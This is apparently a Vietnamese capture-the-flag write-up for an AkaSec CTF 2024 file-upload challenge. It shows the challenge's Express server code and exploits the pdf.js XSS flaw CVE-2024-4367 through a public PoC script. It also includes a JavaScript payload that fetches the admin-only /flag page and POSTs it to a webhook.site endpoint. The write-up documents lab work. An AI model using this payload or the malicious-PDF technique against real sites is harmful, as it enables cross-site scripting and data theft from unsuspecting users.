# Upload 

![338745666-3e8505b5-b77a-4d84-8aed-31d7f894390c](https://github.com/neo-M3tinez/akasec-ctf2024/assets/174318737/55e09ad5-e8e1-4ec8-8de3-17ee6fc3d6ad)


- đầu tiên ta sẽ login vào trang này

![338750520-314cc098-1d4f-465b-b131-bc77eafe8798](https://github.com/neo-M3tinez/akasec-ctf2024/assets/174318737/18a78e4d-ab40-4771-8da4-3f46cfc7adcd)


- khi hoàn thành đăng nhập ta có 1 chức năng upload có khả năng là lỗ hổng nằm ở đây ta sẽ test 1 file bất kì xem filter của nó

![338751338-6ce2c04e-0a34-4256-bcc9-8a974566d3a4](https://github.com/neo-M3tinez/akasec-ctf2024/assets/174318737/bf89cfc8-9910-4773-9c42-10f0e7941db6)


=> sau khi upload 1 file jpg ta có thể thấy file này chỉ lấy file có thông tin về extension upload file là pdf 

[![image](https://github.com/j10nelop/m3d1r/assets/152776722/94966c38-11bf-477a-a458-0fefc6a06d8f)](https://private-user-images.githubusercontent.com/152776722/338756026-94966c38-11bf-477a-a458-0fefc6a06d8f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MjA0MzI1NDQsIm5iZiI6MTcyMDQzMjI0NCwicGF0aCI6Ii8xNTI3NzY3MjIvMzM4NzU2MDI2LTk0OTY2YzM4LTExYmYtNDc3YS1hNDU4LTBmZWZjNmEwNmQ4Zi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwNzA4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDcwOFQwOTUwNDRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT01OThlMjJjOTkxZDU4NjM4OTE3MzU4ODNjZDEzNjg5MjRjODE1ODY5NjZlOThhYTA4MDA0MTljYWU0MGQ3ZTk2JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.o3aEvfOPDehlGWEPqKwd62ihs9W_znry9SeYImQN36s)

- ta cần checking qua đoạn code zip upload

```
const express = require('express');
const multer = require('multer');
const bcrypt = require('bcrypt');
const randomstring = require('randomstring');
const session = require('express-session');
const path = require('path');
const Datastore = require('nedb');
const ejs = require('ejs');
const flash = require('connect-flash');
const PDFJS = require('pdfjs-dist');
const bot = require("./bot")
const rateLimit = require("express-rate-limit")

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
const secretKey = randomstring.generate(32);

app.use(session({
  secret: secretKey,
  resave: false,
  saveUninitialized: false,
  cookie: { name: 'sid' }
}));

app.use(flash());
app.set('views', path.join(__dirname, 'views'));
app.use('/img', express.static(path.join(__dirname, 'img')));
app.set('view engine', 'ejs');
app.set('trust proxy', true);

const limit = rateLimit({
    ...bot,
    validate: {
	validationsConfig: false,
	default: true,
    },
    handler: ((req, res, _next) => {
        const timeRemaining = Math.ceil((req.rateLimit.resetTime - Date.now()) / 1000)
        res.status(429).json({
            error: `Too many requests, please try again later after ${timeRemaining} seconds.`,
        });
    })
})

const users = new Datastore({ filename: path.join(__dirname, 'users.db'), autoload: true });
const uploadfile = new Datastore({ filename: path.join(__dirname, 'uploadfile.db'), autoload: true });

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, './uploads');
  },
  filename: (req, file, cb) => {
    cb(null, file.fieldname + '-' + Date.now() + path.extname(file.originalname));
  },
});

const upload = multer({ 
  storage: storage,
  fileFilter: (req, file, cb) => {
    if (file.mimetype == "application/pdf") {
      cb(null, true);
    } else {
      cb(null, false);
      return cb(new Error('Only .pdf format allowed!'));
    }
  }
});

app.get('/', (req, res) => {
  res.render('index');
});

app.get('/signup', (req, res) => {
  res.render('signup');
});

app.post('/signup', async (req, res) => {
	users.findOne({ username: req.body.username }, async (err, user) => {
	  if (user) {
		res.status(400).send('Username already exists');
	  } else {
		const hashedPassword = await bcrypt.hash(req.body.password, 10);
		users.insert({ username: req.body.username, password: hashedPassword }, (err, newUser) => {
		  if (err) {
			res.status(500).send('Error creating user');
		  } else {
			res.redirect('/login');
		  }
		});
	  }
	});
});

app.get('/login', (req, res) => {
  res.render('login');
});

app.post('/login', async (req, res) => {
	users.findOne({ username: req.body.username }, async (err, user) => {
	  if (err) {
		res.status(500).send('Error logging in');
	  } else if (user && await bcrypt.compare(req.body.password, user.password)) {
		req.session.user = req.body.username;
		res.redirect('/upload');
	  } else {
		res.send('Invalid username or password');
	  }
	});
});

app.get('/upload', (req, res) => {
	let error = req.session.error;
	if (error) {
	  req.flash('error', 'Your error message');
	  return res.redirect('/upload');
	}	
	if (req.session.user) {
	  res.render('upload');
	} else {
	  res.redirect('/login');
	}
});


app.get('/upload', function(req, res) {
    res.render('upload');
});

app.post('/upload', upload.single('file'), (req, res) => {
	const fileData = {
	  filename: req.file.filename,
	  path: req.file.path,
	  user: req.user
	};
  
	uploadfile.insert(fileData, (err, newDoc) => {
	  if (err) {
		res.status(500).send(err);
	  } else {
		res.redirect('/view/' + req.file.filename);
	  }
	});
});

app.get('/logout', (req, res) => {
  req.session.destroy(err => {
    if(err) {
      return res.redirect('/upload');
    }
    res.clearCookie('connect.sid');
    res.redirect('/login');
  })
});

app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
app.use('/pdf.js', express.static(path.join(__dirname, 'node_modules/pdfjs-dist/build/pdf.js')));
app.use('/pdf.worker.js', express.static(path.join(__dirname, 'node_modules/pdfjs-dist/build/pdf.worker.js')));

app.get('/view/:filename', async (req, res) => {
    let filename = req.params.filename;
    res.render('view', { filename: filename });
});

app.get("/report", (_, res) => {
    const { name } = bot
    res.render("bot", { name });
});

app.post("/report", limit, async (req, res) => {
    const { url } = req.body;
    if (!url) {
        return res.status(400).send({ error: "Url is missing." });
    }
    if (!RegExp(bot.urlRegex).test(url)) {
        return res.status(422).send({ error: "URL din't match this regex format " + bot.urlRegex })
    }
    if (await bot.bot(url)) {
        return res.send({ success: "Admin successfully visited the URL." });
    } else {
        return res.status(500).send({ error: "Admin failed to visit the URL." });
    }
});

app.get('/flag', (req, res) => {
  let ip = req.connection.remoteAddress;
  if (ip === '127.0.0.1') {
    res.json({ flag: 'AKASEC{FAKE_FLAG}' });
  } else {
    res.status(403).json({ error: 'Access denied' });
  }
});

app.listen(5000, '0.0.0.0', () => console.log('Server started on port 5000'));

```
+ nhìn qua thì cũng là dạng lưu content mã độc  từ phía server sau khi upload và gửi từ bot admin tại local của file đó vì "ip == '127.0.0.' là sẽ phải gửi đến địa chỉ local qua 1 report là bot admin 

 => sau khi search thì đây là lỗ hổng pdf injection trên xss  'CVE-2024-4367' 

- ta sẽ test trến script có sẵn từ nguồn github https://github.com/LOURC0D3/CVE-2024-4367-PoC.git

``` python3 CVE-2024-4367 'alert(1)'```

=> generate ra file pdf file chứa xss 

![338759508-9a9f9bcc-9345-4add-8f47-3b12ed9971c3](https://github.com/neo-M3tinez/akasec-ctf2024/assets/174318737/315e9d76-d6e7-4c93-b383-7d08d76a610b)


=> nó trả về thông tin alert từ hệ thống 

=> ta cần generate ra 1 payload có thể nhận được respond từ địa chỉ đích và hook content của nó qua webhook 

=> payload

```
fetch\('/flag'\).then\(response => { return response.json\(\); }\).then\(data => { fetch\('https://webhook.site/13599e56-a383-436d-8504-d3d87c24a8bb', {method: 'POST',mode: 'no-cors',body: JSON.stringify\(data\)}\) })
```

![338784010-d88295a7-c261-475d-9ad4-81e35717ab45](https://github.com/neo-M3tinez/akasec-ctf2024/assets/174318737/1c448760-e0ef-42f1-8f56-2229642eec8d)


=> send link http://127.0.0.1:5000/view/file-1718153210636.pdf

qua bot lên server fetch flag của địa chỉ đó

![338785519-8ab5a75f-fc57-4643-b476-43a83d7a5ef7](https://github.com/neo-M3tinez/akasec-ctf2024/assets/174318737/af9692a7-f8d6-4a2f-9671-412f37326949)


=> flag:AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3_r0t4t333d_loooool}
